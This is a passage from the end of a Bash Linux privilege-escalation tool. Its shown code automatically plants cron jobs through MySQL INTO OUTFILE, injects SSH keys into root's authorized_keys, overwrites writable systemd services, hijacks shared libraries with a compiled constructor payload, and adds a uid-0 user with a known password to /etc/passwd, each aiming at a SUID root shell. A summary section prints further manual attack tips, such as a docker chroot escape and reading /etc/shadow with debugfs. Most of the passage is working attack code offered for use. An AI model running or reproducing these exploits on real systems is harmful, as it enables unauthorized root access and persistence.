              timeout 5 mysql -u"$mysql_user" ${mysql_pass:+-p"$mysql_pass"} -e \
                "SELECT '* * * * * root cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' INTO OUTFILE '$cron_target'" 2>/dev/null
              if [ -f "$cron_target" ]; then
                success "Cron job planted at $cron_target, wait ~60s then: /tmp/rootbash -p"
                udf_done=true
              fi
            fi
          fi
        fi
      fi
    done < "$dbcred_file"
  fi
  
  # ---- 4. Writable authorized_keys for root ----
  subheader "SSH authorized_keys injection"
  if [ -w /root/.ssh/authorized_keys ] 2>/dev/null || [ -w /root/.ssh/ ] 2>/dev/null; then
    exploit_attempt "SSH authorized_keys injection -> root"
    local gen_key=false
    if command_exists ssh-keygen; then
      ssh-keygen -t ed25519 -f "$TMPDIR/.injkey" -N "" -q 2>/dev/null
      if [ -f "$TMPDIR/.injkey.pub" ]; then
        gen_key=true
        mkdir -p /root/.ssh 2>/dev/null
        cat "$TMPDIR/.injkey.pub" >> /root/.ssh/authorized_keys 2>/dev/null
        chmod 600 /root/.ssh/authorized_keys 2>/dev/null
        
        local ssh_test
        ssh_test=$(timeout 5 ssh -o StrictHostKeyChecking=no -o BatchMode=yes \
          -o ConnectTimeout=3 -i "$TMPDIR/.injkey" \
          root@127.0.0.1 "id" 2>/dev/null)
        if echo "$ssh_test" | grep -q "uid=0"; then
          exploit_success "SSH key injected into /root/.ssh/authorized_keys"
          success "Root shell via: ssh -i $TMPDIR/.injkey root@127.0.0.1"
          timeout 5 ssh -o StrictHostKeyChecking=no -o BatchMode=yes \
            -o ConnectTimeout=3 -i "$TMPDIR/.injkey" \
            root@127.0.0.1 "/bin/bash" 2>/dev/null
          GOT_ROOT=true
          return
        fi
        exploit_failed "SSH authorized_keys injection (key added but login failed)"
      fi
    fi
  fi
  
  # ---- 5. Writable systemd service exploitation ----
  subheader "Writable service exploitation"
  for svc_dir in /etc/systemd/system/ /usr/lib/systemd/system/ /lib/systemd/system/; do
    find "$svc_dir" -writable -name "*.service" -type f 2>/dev/null | while IFS= read -r svc; do
      exploit_attempt "Writable systemd service: $svc"
      local orig_exec=$(grep "^ExecStart=" "$svc" 2>/dev/null)
      
      cat > "$svc" << SVCEOF
[Unit]
Description=System update

[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash'

[Install]
WantedBy=multi-user.target
SVCEOF
      
      systemctl daemon-reload 2>/dev/null
      local svc_name=$(basename "$svc")
      systemctl start "$svc_name" 2>/dev/null
      sleep 1
      
      if verify_suid_root /tmp/rootbash; then
        exploit_success "Writable systemd service -> SUID bash"
        success "Run: /tmp/rootbash -p"
        /tmp/rootbash -p 2>/dev/null
        check_root_shell && { GOT_ROOT=true; return; }
      fi
      exploit_failed "Writable systemd service: $svc"
    done
  done
  
  # ---- 6. Writable cron directory exploitation ----
  subheader "Writable cron exploitation"
  for cron_dir in /etc/cron.d /etc/cron.daily /etc/cron.hourly; do
    if [ -w "$cron_dir" ]; then
      exploit_attempt "Writable cron dir: $cron_dir"
      echo "* * * * * root cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash" > "$cron_dir/bump_lpe_$$" 2>/dev/null
      if [ -f "$cron_dir/bump_lpe_$$" ]; then
        success "Cron payload written to $cron_dir/bump_lpe_$$"
        info "Waiting up to 70 seconds for cron execution..."
        local waited=0
        while [ $waited -lt 70 ]; do
          sleep 5
          waited=$((waited + 5))
          if verify_suid_root /tmp/rootbash; then
            exploit_success "Cron -> SUID bash"
            success "Run: /tmp/rootbash -p"
            rm -f "$cron_dir/bump_lpe_$$" 2>/dev/null
            /tmp/rootbash -p 2>/dev/null
            check_root_shell && { GOT_ROOT=true; return; }
          fi
        done
        rm -f "$cron_dir/bump_lpe_$$" 2>/dev/null
        exploit_failed "Cron dir $cron_dir (payload didn't execute in time)"
      fi
    fi
  done
  
  # ---- 7. Writable /etc/ld.so.conf.d exploitation ----
  subheader "Shared library hijacking"
  if [ -w /etc/ld.so.conf.d/ ] && command_exists gcc; then
    local target_lib=""
    local target_suid=""
    timeout 10 find / -perm -4000 -type f -not -path "/proc/*" -not -path "/sys/*" \
      -not -path "/dev/*" -not -path "/nix/*" -not -path "/snap/*" -not -path "/run/*" \
      2>/dev/null | head -10 | while IFS= read -r suid_bin; do
      if command_exists ldd; then
        local needed_lib=$(ldd "$suid_bin" 2>/dev/null | grep "not found" | head -1 | awk '{print $1}')
        if [ -n "$needed_lib" ]; then
          exploit_attempt "Shared library hijacking: $needed_lib for $suid_bin"
          local hijack_src="$TMPDIR/hijack.c"
          cat > "$hijack_src" << 'HIJACK_EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
static void hijack() __attribute__((constructor));
void hijack() {
    setuid(0); setgid(0);
    system("cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash");
}
HIJACK_EOF
          mkdir -p "$TMPDIR/hijack_lib" 2>/dev/null
          gcc -shared -fPIC -o "$TMPDIR/hijack_lib/$needed_lib" "$hijack_src" 2>/dev/null
          if [ -f "$TMPDIR/hijack_lib/$needed_lib" ]; then
            echo "$TMPDIR/hijack_lib" > /etc/ld.so.conf.d/bump_lpe.conf 2>/dev/null
            ldconfig 2>/dev/null
            "$suid_bin" 2>/dev/null
            rm -f /etc/ld.so.conf.d/bump_lpe.conf 2>/dev/null
            ldconfig 2>/dev/null
            if verify_suid_root /tmp/rootbash; then
              exploit_success "Shared library hijacking -> SUID bash"
              /tmp/rootbash -p 2>/dev/null
              check_root_shell && { GOT_ROOT=true; return; }
            fi
            exploit_failed "Shared library hijacking: $needed_lib"
          fi
        fi
      fi
    done
  fi
  
  # ---- 8. Writable /etc/passwd (if not already tried) ----
  if [ -w /etc/passwd ]; then
    local already_tried=$(grep -c "pwnkit" /etc/passwd 2>/dev/null)
    if [ "$already_tried" -eq 0 ] 2>/dev/null; then
      subheader "Writable /etc/passwd (retry)"
      exploit_attempt "Writable /etc/passwd -> add root user"
      local pw_hash=$(openssl passwd -1 -salt bump pwnkit 2>/dev/null || echo '$1$bump$RVTkPvPYsb4TtLU0UxD2E.')
      echo "pwnkit:${pw_hash}:0:0:pwnkit:/root:/bin/bash" >> /etc/passwd
      if su pwnkit -c "id" 2>/dev/null | grep -q "uid=0"; then
        exploit_success "Added pwnkit:pwnkit uid=0 to /etc/passwd"
        success "Root: su pwnkit (password: pwnkit)"
        su pwnkit -c "/bin/bash" 2>/dev/null
        GOT_ROOT=true
        return
      fi
      exploit_failed "/etc/passwd write (su failed)"
    fi
  fi
}

# ============================================================================
# SUMMARY & REPORT
# ============================================================================
print_summary() {
  header "SCAN SUMMARY"
  
  echo ""
  local vc; vc=$(get_vector_count)
  local ea; ea=$(get_attempt_count)
  local es; es=$(get_success_count)
  local ef; ef=$(get_failure_count)

  if [ "$GOT_ROOT" = true ]; then
    echo -e "${BG_G}${BOLD}  ROOT ACCESS OBTAINED!  ${RST}"
    echo ""
    success "You now have root privileges"
  elif [ "$vc" -gt 0 ] 2>/dev/null; then
    echo -e "${LY}${BOLD}  Found ${vc} privilege escalation vector(s)${RST}"
    echo ""
    
    if [ -s "$VECTOR_LIST_FILE" ]; then
      echo -e "${W}  Vectors found:${RST}"
      while IFS= read -r v; do
        [ -n "$v" ] && echo -e "    ${LR}>>>${RST} $v"
      done < "$VECTOR_LIST_FILE"
      echo ""
    fi
    
    if [ "$AUTO_EXPLOIT" = true ]; then
      echo -e "${W}  Exploitation results:${RST}"
      echo -e "    Attempts:  ${LY}${ea}${RST}"
      if [ "$es" -gt 0 ] 2>/dev/null; then
        echo -e "    Succeeded: ${LG}${es}${RST}"
      fi
      echo -e "    Failed:    ${LR}${ef}${RST}"
      echo ""
      if [ "$ef" -gt 0 ] 2>/dev/null && [ "$GOT_ROOT" != true ]; then
        echo -e "${LY}${BOLD}  MANUAL NEXT STEPS:${RST}"
        echo ""
        local has_tips=false
        local tip_suid=false tip_sudo=false tip_caps=false tip_cron=false
        local tip_docker=false tip_write=false tip_kernel=false tip_nfs=false
        local tip_ld=false tip_db=false tip_ssh=false tip_creds_generic=false
        if [ -s "$VECTOR_LIST_FILE" ]; then
          while IFS= read -r vec; do
            [ -z "$vec" ] && continue
            local vec_lower
            vec_lower=$(echo "$vec" | tr '[:upper:]' '[:lower:]')
            case "$vec_lower" in
              *suid*|*sgid*)
                if [ "$tip_suid" = false ]; then
                  echo -e "    ${LC}[SUID]${RST} Check GTFOBins manually: ${W}https://gtfobins.github.io/${RST}"
                  echo -e "           Try: ${LG}strings <binary>${RST} to find relative path calls for PATH hijack"
                  echo -e "           Try: ${LG}ltrace <binary>${RST} to trace library/system calls"
                  tip_suid=true; has_tips=true
                fi ;;
              *sudo*|*sudoer*)
                if [ "$tip_sudo" = false ]; then
                  echo -e "    ${LC}[SUDO]${RST} Check sudo version: ${LG}sudo --version${RST}"
                  echo -e "           Check: ${W}https://gtfobins.github.io/${RST} for sudo exploits"
                  echo -e "           Try: ${LG}sudo -l${RST} and look for NOPASSWD entries manually"
                  tip_sudo=true; has_tips=true
                fi ;;
              *capability*|*cap_*)
                if [ "$tip_caps" = false ]; then
                  echo -e "    ${LC}[CAPS]${RST} Review: ${LG}getcap -r / 2>/dev/null${RST}"
                  echo -e "           Reference: ${W}https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/linux-capabilities${RST}"
                  tip_caps=true; has_tips=true
                fi ;;
              *cron*)
                if [ "$tip_cron" = false ]; then
                  echo -e "    ${LC}[CRON]${RST} Monitor cron: ${LG}pspy64${RST} (https://github.com/DominicBreuker/pspy)"
                  echo -e "           Check for wildcard injection or writable scripts in cron PATH"
                  tip_cron=true; has_tips=true
                fi ;;
              *docker*|*container*|*lxc*|*podman*)
                if [ "$tip_docker" = false ]; then
                  echo -e "    ${LC}[CONTAINER]${RST} If docker socket accessible: ${LG}docker run -v /:/mnt --rm -it alpine chroot /mnt bash${RST}"
                  echo -e "               If in privileged container: try cgroup escape or mount host disk"
                  tip_docker=true; has_tips=true
                fi ;;
              *writable*|*passwd*|*shadow*)
                if [ "$tip_write" = false ]; then
                  echo -e "    ${LC}[WRITE]${RST} If /etc/passwd writable: ${LG}echo 'r00t:\$1\$bump\$RVTkPvPYsb4TtLU0UxD2E.:0:0::/root:/bin/bash' >> /etc/passwd${RST}"
                  echo -e "           Then: ${LG}su r00t${RST} (password: pwnkit)"
                  tip_write=true; has_tips=true
                fi ;;
              *kernel*|*cve*|*dirty*|*pwnkit*|*overlay*)
                if [ "$tip_kernel" = false ]; then
                  echo -e "    ${LC}[KERNEL]${RST} Download exploits manually from exploit-db.com"
                  echo -e "            Compile on target: ${LG}gcc exploit.c -o exploit && ./exploit${RST}"
                  tip_kernel=true; has_tips=true
                fi ;;
              *nfs*)
                if [ "$tip_nfs" = false ]; then
                  echo -e "    ${LC}[NFS]${RST} From attacker machine: ${LG}showmount -e <target>${RST}"
                  echo -e "          Mount share, create SUID binary as root, execute on target"
                  tip_nfs=true; has_tips=true
                fi ;;
              *ld_preload*|*ld_library*)
                if [ "$tip_ld" = false ]; then
                  echo -e "    ${LC}[LD]${RST} Create malicious .so: compile setuid(0)+system('/bin/bash')"
                  echo -e "         Run: ${LG}sudo LD_PRELOAD=/tmp/evil.so <allowed_command>${RST}"
                  tip_ld=true; has_tips=true
                fi ;;
              *mysql*|*udf*|*database*|*mariadb*)
                if [ "$tip_db" = false ]; then
                  echo -e "    ${LC}[DB]${RST} Try: ${LG}mysql -u root -p${RST} with found passwords"
                  echo -e "         UDF: ${W}https://book.hacktricks.wiki/en/pentesting-web/sql-injection/mysql-injection/mysql-ssrf${RST}"
                  tip_db=true; has_tips=true
                fi ;;
              *ssh*key*|*ssh*pivot*|*private*key*)
                if [ "$tip_ssh" = false ]; then
                  echo -e "    ${LC}[SSH]${RST} Try keys on other hosts: ${LG}ssh -i <key> root@<other_host>${RST}"
                  echo -e "          Check ~/.ssh/config and /etc/hosts for more targets"
                  tip_ssh=true; has_tips=true
                fi ;;
              *credential*|*password*|*history*)
                if [ "$tip_creds_generic" = false ]; then
                  echo -e "    ${LC}[CREDS]${RST} Try found passwords: ${LG}su - root${RST} or ${LG}ssh root@localhost${RST}"
                  echo -e "           Check: .bash_history, .mysql_history, env vars for more"
                  tip_creds_generic=true; has_tips=true
                fi ;;
              *disk*group*)
                echo -e "    ${LC}[DISK]${RST} Raw disk access: ${LG}debugfs /dev/sda1${RST}"
                echo -e "           Read /etc/shadow: ${LG}debugfs -R 'cat /etc/shadow' /dev/sda1${RST}"
                has_tips=true ;;
              *snap*|*dirty_sock*)
                echo -e "    ${LC}[SNAP]${RST} Try dirty_sock exploit: ${W}https://github.com/initstring/dirty_sock${RST}"
                has_tips=true ;;
              *path*hijack*|*\\.*in*path*)
                echo -e "    ${LC}[PATH]${RST} Current dir in PATH: place malicious binary in . to hijack SUID calls"
                has_tips=true ;;
            esac
          done < "$VECTOR_LIST_FILE"
        fi
        local dbcred_file="$TMPDIR/.found_dbcreds"
        local cred_file="$TMPDIR/.found_creds"
        if [ -s "$dbcred_file" ] || [ -s "$cred_file" ]; then
          echo ""
          echo -e "    ${LC}[CREDS]${RST} Credentials were found during scan. Try them manually:"
          echo -e "           ${LG}su - root${RST} with each password"
          echo -e "           ${LG}ssh root@localhost${RST} with each password"
          if [ -s "$dbcred_file" ]; then
            local cred_count
            cred_count=$(wc -l < "$dbcred_file" 2>/dev/null | tr -d ' ')
            echo -e "           ${W}Database credentials found: ${LY}${cred_count}${RST}"
          fi
          has_tips=true
        fi
        if [ "$has_tips" = false ]; then
          echo -e "    ${W}Review vectors above and research exploitation manually${RST}"
        fi
        echo ""
        if [ "$AGGRESSIVE" != true ]; then
          echo -e "${LY}  Also try:${RST}"
          echo -e "${W}    --aggressive    Attempt kernel exploits (risk of crash)${RST}"
        fi
      fi
    else
      echo -e "${W}  Run with ${LR}--exploit${W} to attempt automatic exploitation${RST}"
      echo -e "${W}  Run with ${LR}--exploit --aggressive${W} for kernel exploits too${RST}"
    fi
  else
    echo -e "${GR}  No obvious privilege escalation vectors found.${RST}"
    echo ""
    if [ "$AGGRESSIVE" != true ]; then
      echo -e "${W}  Try: --aggressive for kernel exploit checks${RST}"
    fi
    if [ "$VERBOSE" != true ]; then
      echo -e "${W}  Try: --verbose for deeper enumeration output${RST}"
    fi
  fi
  
  echo ""
}

# ============================================================================
# MAIN
# ============================================================================
main() {
  parse_args "$@"
  setup_colors
  
  # Create working directories
  mkdir -p "$TMPDIR" "$EXPLOIT_DIR" 2>/dev/null
  chmod 700 "$TMPDIR" 2>/dev/null
  
  trap 'cleanup' EXIT INT TERM
  
  if [ "$QUIET" != true ]; then
    banner
  fi
  
  info "Starting privilege escalation scan..."
  info "Mode: $([ "$AUTO_EXPLOIT" = true ] && echo "${LR}EXPLOIT${RST}" || echo "${LG}SCAN${RST}")"
  info "Aggressive: $([ "$AGGRESSIVE" = true ] && echo "${LR}YES${RST}" || echo "${LG}NO${RST}")"
  info "Verbose: $([ "$VERBOSE" = true ] && echo "${LC}YES${RST}" || echo "${GR}NO${RST}")"
  echo ""
  
  # Run all checks
  gather_system_info
  [ "$GOT_ROOT" = true ] && { print_summary; return; }
  
  check_sudo
  [ "$GOT_ROOT" = true ] && { print_summary; return; }
  
  check_suid
  [ "$GOT_ROOT" = true ] && { print_summary; return; }
  
  check_capabilities
  [ "$GOT_ROOT" = true ] && { print_summary; return; }
  
  check_cron
  [ "$GOT_ROOT" = true ] && { print_summary; return; }
  
  check_writable
  [ "$GOT_ROOT" = true ] && { print_summary; return; }
  
  check_docker
  [ "$GOT_ROOT" = true ] && { print_summary; return; }
  
  check_ld_preload
  [ "$GOT_ROOT" = true ] && { print_summary; return; }
  
  check_path_hijack
  
  check_nfs
  
  check_passwords
  
  check_network
  [ "$GOT_ROOT" = true ] && { print_summary; return; }
  
  check_kernel_exploits
  [ "$GOT_ROOT" = true ] && { print_summary; return; }
  
  check_misc
  
  # Post-scan exploitation: try credentials, SSH keys, etc.
  if [ "$AUTO_EXPLOIT" = true ]; then
    post_scan_exploit
    [ "$GOT_ROOT" = true ] && { print_summary; return; }
  fi
  
  # Download and run additional exploits
  if [ "$AUTO_EXPLOIT" = true ] || [ "$AGGRESSIVE" = true ]; then
    auto_download_exploits
  fi
  
  print_summary
}

# Run
main "$@"
